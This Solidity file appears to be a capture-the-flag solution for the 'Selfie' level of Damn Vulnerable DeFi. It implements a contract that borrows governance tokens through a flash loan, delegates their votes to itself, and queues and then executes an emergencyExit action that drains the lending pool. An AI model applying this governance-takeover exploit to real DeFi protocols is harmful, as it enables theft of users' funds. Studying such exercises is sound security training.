// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "lib/forge-std/src/interfaces/IERC20.sol";

contract Attack is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableTokens;

    uint256 actionId = 0;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor (
        address _selfiePool,
        address _simpleGovernance,
        address _token
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableTokens = DamnValuableVotes(_token);
    }

    function onFlashLoan(address initiator, address token,uint amount, uint fee, bytes calldata data) 
    external returns(bytes32)
    {
        damnValuableTokens.delegate(address(this));
        uint _actionId = simpleGovernance.queueAction
        (
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns (bool) {
        uint amountRequired = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableTokens), amountRequired, data);
    }

    function exploitCloseup() external returns (bool) {
        bytes memory resultData = simpleGovernance.executeAction(actionId);
    }
}